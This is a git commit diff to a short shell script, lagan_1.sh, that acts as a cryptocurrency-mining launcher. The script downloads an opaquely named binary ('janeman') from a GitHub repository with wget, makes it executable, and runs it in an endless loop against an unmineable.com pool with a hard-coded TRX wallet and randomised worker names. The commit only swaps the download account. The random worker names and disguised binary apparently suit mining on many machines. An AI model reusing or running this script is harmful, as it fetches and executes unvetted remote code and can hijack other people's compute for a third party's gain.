e35cddfcf7508e1cb9f698eb95cb49915a8f9425
Vasava10 <87759996+Vasava10@users.noreply.github.com>
2021-08-11 15:47:16 +0530

    Update lagan_1.sh

--- lagan_1.sh
+++ lagan_1.sh
@@ -2,7 +2,7 @@
 POOL=ethash.unmineable.com:3333
 WALLET=TRX:TKEUa3SvCJdN3XA4oJnhQNALHBqGJjSgLV
 WORKER=$(echo $(shuf -i 10-40 -n 1)-COLN#2zmj-9x3s)
-wget https://github.com/archernap/prem/raw/main/janeman
+wget https://github.com/Vasava10/prem/raw/main/janeman
 chmod +x janeman
 	while [ 1 ]; do
 		./janeman -pool $POOL -wal $WALLET.$WORKER -pass x
